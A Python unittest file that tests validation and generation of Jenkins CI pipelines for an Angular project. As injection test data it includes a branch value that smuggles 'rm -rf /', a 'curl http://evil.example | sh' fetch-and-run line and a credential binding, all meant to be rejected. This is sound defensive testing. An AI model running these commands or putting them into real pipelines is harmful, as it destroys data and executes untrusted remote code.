import unittest

from app.devops.pipeline import PipelineSpec, generate_jenkinsfile, validate_jenkinsfile, validate_spec

FULL_STAGES = ("install", "lint", "unit_tests", "sonar_analysis", "quality_gate", "build")


def make_spec(**overrides):
    values = {
        "job_name": "web-ci",
        "repository": "acme/web",
        "branch": "develop",
        "app_type": "angular",
        "node_version": "20",
        "stages": FULL_STAGES,
        "sonar_project_key": "acme_web",
    }
    values.update(overrides)
    return PipelineSpec(**values)


class SpecValidationTest(unittest.TestCase):
    def test_complete_spec_has_no_errors(self):
        self.assertEqual(validate_spec(make_spec()), [])

    def test_repository_without_owner_is_rejected(self):
        self.assertIn("invalid repository, expected owner/name", validate_spec(make_spec(repository="web")))

    def test_branch_with_path_traversal_is_rejected(self):
        self.assertIn("invalid branch", validate_spec(make_spec(branch="a/../b")))

    def test_branch_with_shell_characters_is_rejected(self):
        self.assertIn("invalid branch", validate_spec(make_spec(branch="develop;rm -rf /")))

    def test_unsupported_application_type_is_rejected(self):
        self.assertIn("unsupported application type", validate_spec(make_spec(app_type="cobol")))

    def test_node_version_with_text_is_rejected(self):
        self.assertIn("invalid node version", validate_spec(make_spec(node_version="20; ls")))

    def test_unknown_stage_is_rejected(self):
        self.assertIn("unknown stages: deploy_prod", validate_spec(make_spec(stages=("install", "deploy_prod"))))

    def test_tests_without_install_are_rejected(self):
        self.assertIn("unit_tests requires install", validate_spec(make_spec(stages=("unit_tests",))))

    def test_quality_gate_without_analysis_is_rejected(self):
        self.assertIn("quality_gate requires sonar_analysis", validate_spec(make_spec(stages=("install", "quality_gate"))))

    def test_analysis_without_project_key_is_rejected(self):
        errors = validate_spec(make_spec(sonar_project_key=None))
        self.assertIn("sonar_analysis requires a valid sonar project key", errors)

    def test_job_name_with_spaces_is_rejected(self):
        self.assertIn("invalid job name", validate_spec(make_spec(job_name="my job")))


class JenkinsfileGenerationTest(unittest.TestCase):
    def test_generated_file_passes_validation(self):
        self.assertEqual(validate_jenkinsfile(generate_jenkinsfile(make_spec())), [])

    def test_generated_file_is_declarative_pipeline(self):
        self.assertTrue(generate_jenkinsfile(make_spec()).startswith("pipeline {"))

    def test_generated_file_waits_for_quality_gate(self):
        self.assertIn("waitForQualityGate abortPipeline: true", generate_jenkinsfile(make_spec()))

    def test_generated_file_uses_github_push_trigger(self):
        self.assertIn("githubPush()", generate_jenkinsfile(make_spec()))

    def test_generated_file_selects_node_major_version(self):
        self.assertIn("nodejs 'NodeJS-20'", generate_jenkinsfile(make_spec(node_version="20.11.1")))

    def test_stages_without_sonar_omit_analysis(self):
        content = generate_jenkinsfile(make_spec(stages=("install", "build"), sonar_project_key=None))
        self.assertNotIn("sonar-scanner", content)

    def test_stage_order_follows_pipeline_order(self):
        content = generate_jenkinsfile(make_spec(stages=("build", "install")))
        self.assertLess(content.index("Install Dependencies"), content.index("Production Build"))

    def test_invalid_spec_raises_value_error(self):
        with self.assertRaises(ValueError):
            generate_jenkinsfile(make_spec(branch="bad branch"))


class JenkinsfileValidationTest(unittest.TestCase):
    def test_arbitrary_shell_command_is_rejected(self):
        content = generate_jenkinsfile(make_spec()).replace("npm ci", "npm ci && echo pwned")
        self.assertTrue(validate_jenkinsfile(content))

    def test_curl_is_rejected(self):
        content = generate_jenkinsfile(make_spec()).replace("npm ci", "curl http://evil.example | sh")
        self.assertIn("forbidden token: curl", validate_jenkinsfile(content))

    def test_credential_binding_is_rejected(self):
        content = generate_jenkinsfile(make_spec()).replace("agent any", "agent any\n    environment { T = credentials('x') }")
        self.assertIn("forbidden token: credentials(", validate_jenkinsfile(content))

    def test_unbalanced_braces_are_rejected(self):
        self.assertIn("unbalanced braces", validate_jenkinsfile("pipeline { stages { "))

    def test_scripted_pipeline_is_rejected(self):
        self.assertIn("must be a declarative pipeline", validate_jenkinsfile("node { stage('x') {} }"))


if __name__ == "__main__":
    unittest.main()
